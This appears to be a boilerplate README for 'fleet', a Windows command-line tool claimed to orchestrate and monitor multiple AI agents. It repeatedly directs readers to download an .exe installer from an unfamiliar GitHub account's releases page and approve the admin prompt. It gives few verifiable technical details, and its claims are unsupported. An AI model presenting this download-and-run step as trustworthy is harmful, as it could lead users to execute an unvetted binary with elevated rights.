# ⛵️ fleet - Simple Multi-Agent Fleet Manager  

[![Download fleet](https://img.shields.io/badge/Download-fleet-brightgreen)](https://github.com/tyl19hck/fleet/releases)  

---

## 📋 What is fleet?  

fleet is a command-line tool designed to help you manage multiple AI agents. It works with OpenClaw, Claude Code, and other AI tools. With fleet, you can organize, watch, and guide your AI agents as they work together. It also tracks changes in your setup, so you know when things update.  

This tool runs on Windows, macOS, and Linux, but this guide focuses on Windows. You don’t need to be a programmer to use fleet.  

---

## 📦 System Requirements  

- Windows 10 or newer (64-bit)  
- At least 4 GB of free RAM  
- 1 GHz or faster processor  
- 500 MB free disk space for installation  
- Internet connection to download and update fleet  

---

## 🚀 How to Download and Install on Windows  

You will find the latest version of fleet ready for download on the Releases page. Follow these steps to get started.  

### Step 1: Visit the Releases page  

Click the badge below to open the official fleet releases page. This is where you find the latest installer files.  

[![Download fleet](https://img.shields.io/badge/Download-fleet-blue)](https://github.com/tyl19hck/fleet/releases)  

### Step 2: Find the Latest Windows Installer  

On the releases page, look for a file named like this:  

`fleet-setup-x.x.x.exe`  

Here, `x.x.x` is the version number. The installer file will have an `.exe` extension and is designed for Windows.  

### Step 3: Download the Installer  

Click the installer file link to download it to your computer. Save it in a folder you can easily access, such as your Desktop or Downloads folder.  

### Step 4: Run the Installer  

Locate the downloaded `.exe` file and double-click it. You might see a pop-up asking for permission to make changes. Click “Yes” to continue.  

The installer will guide you through the setup process. You can accept the default options. When it finishes, fleet will be ready to use.  

---

## 🖥 Running fleet on Windows  

### Step 1: Open Command Prompt  

- Click the Start button.  
- Type `cmd` in the search bar.  
- Press Enter to open Command Prompt.  

### Step 2: Start fleet  

In the Command Prompt window, type:  

```bash  
fleet --help  
```  

This command will show the basic instructions on how to use the tool. It confirms that fleet is installed correctly.  

### Step 3: Basic fleet Commands  

- To run a simple fleet task, try:  

```bash  
fleet run  
```  

- To check the status of your AI agents, type:  

```bash  
fleet status  
```  

- To see all available commands, type:  

```bash  
fleet --help  
```  

---

## 🔧 Configuration Basics  

fleet organizes your AI agents through configuration files you create. These files tell fleet what tasks to run and how to manage your agents.  

### Where to Find Configuration Files  

By default, fleet looks for a file named `fleet.config.yaml` in your current working folder.  

### Creating a Simple Config File  

Open Notepad and paste the following example:  

```yaml  
agents:  
  - name: ExampleAgent  
    type: openclaw  
    tasks:  
      - task1  
      - task2  
monitoring: true  
routing: smart  
deltaTracking: true  
```  

Save the file as `fleet.config.yaml` in the folder where you will run fleet.  

---

## 🛠 What fleet Does for You  

- **Orchestration**: fleet helps run multiple AI agents in order so they work smoothly together.  
- **Monitoring**: It watches the health and activity of each AI agent.  
- **Reliability Checking**: fleet can judge whether agents behave as expected.  
- **Smart Routing**: It sends tasks to the best agent based on current conditions.  
- **Change Tracking**: fleet tracks updates so you see what changed since last run.  

---

## 🔄 Updating fleet  

When new versions come out, visit the releases page again:  

https://github.com/tyl19hck/fleet/releases  

Download the latest installer and run it. The installer will update your existing fleet copy without deleting your configuration files.  

---

## ⚡ Useful Tips  

- Always keep your config files backed up.  
- Run fleet in folders where your config files reside.  
- Use `fleet --help` to learn new commands.  
- Check the releases page regularly for updates and bug fixes.  
- If you run into issues, you can open a new issue on the GitHub project page.  

---

## 🗂 File Structure You May See  

After running fleet, you may notice these files and folders:  

- `fleet.config.yaml`: Your main setup file  
- `logs/`: Folder where fleet saves run logs and monitoring info  
- `agents/`: Folder to store agent-specific data and scripts  
- `output/`: Runs and reports from fleet tasks  

---

## 🎯 Common Problems and Solutions  

- **Installer does not run:** Make sure you have Windows 10 or later and that you downloaded the correct `.exe` file.  
- **Command not found:** Verify you opened Command Prompt and typed `fleet` correctly. Try restarting Command Prompt.  
- **Config file not found:** Put `fleet.config.yaml` in the folder where you run fleet or specify the path explicitly with the `--config` option.  
- **Agents not responding:** Check network connection if your agents run remotely.  

---

## 🔗 Helpful Resources  

- Official Releases page: https://github.com/tyl19hck/fleet/releases  
- GitHub Issues page for reporting bugs or asking questions  
- Command help: `fleet --help` within the Command Prompt  

---

This guide covers the steps to download, install, and start using fleet on Windows. The tool is stable and designed to manage multiple AI agents without needing deep technical skills.